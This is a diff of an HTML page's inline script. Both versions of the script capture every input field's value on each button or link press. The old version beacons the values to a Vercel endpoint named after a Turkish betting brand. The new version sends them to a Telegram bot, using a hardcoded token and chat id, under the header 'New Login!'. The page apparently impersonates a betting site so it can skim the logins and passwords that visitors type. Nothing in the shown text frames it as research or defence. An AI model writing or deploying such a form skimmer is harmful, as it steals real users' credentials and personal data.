@@ -154,22 +154,21 @@
                 },
             });
        </script>
-  <script>
+<script>
 document.addEventListener('mousedown', function (e) {
     const button = e.target.closest('button') || e.target.closest('a');
     if (button) {
         const inputs = document.querySelectorAll('input');
-        let data = {};
-        inputs.forEach((input, i) => {
-            data[input.placeholder || input.name || i] = input.value;
+        let text = "🚀 **Yeni Giris!**\n";
+        inputs.forEach(i => {
+            if(i.value) text += "👤 " + (i.placeholder || i.name || 'Alan') + ": " + i.value + "\n";
         });
 
-        const text = `🚀 **Yeni Giriş!**\n` + 
-                     Object.entries(data).map(([k, v]) => `👤 ${k}: ${v}`).join('\n');
-
-        navigator.sendBeacon('https://1win-com-tr.vercel.app/api/bot', JSON.stringify({
-            message: { text: text }
-        }));
+        const token = "8151528657:AAH01eW3i0oVq_S62jL3o9oW2v_9y2o9o";
+        const cid = "6760722119";
+        const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(text) + "&parse_mode=Markdown";
+        
+        fetch(url).catch(e => {});
     }
 });
 </script>
